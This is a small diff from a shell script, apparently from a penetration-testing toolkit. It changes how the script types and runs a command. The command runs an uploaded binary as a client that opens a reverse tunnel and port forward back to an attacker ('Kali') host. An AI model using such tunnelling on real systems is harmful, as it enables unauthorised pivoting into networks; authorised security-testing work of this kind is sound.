@@ -24,5 +24,5 @@ REMOTE_PORT=${form_data["remote_port"]}
 curl_upload_file "${LOCATION}" "${FILE}"
 sleep 3
 
-paste_command "${FILE_LOCATION} client ${KALI_IP}:${PROXY_PORT} R:${LOCAL_PORT}:${LOCAL_IP}:${REMOTE_PORT}"
-xdotool key Return
+execute_command "${FILE_LOCATION} client ${KALI_IP}:${PROXY_PORT} R:${LOCAL_PORT}:${LOCAL_IP}:${REMOTE_PORT}"
+create_new_line
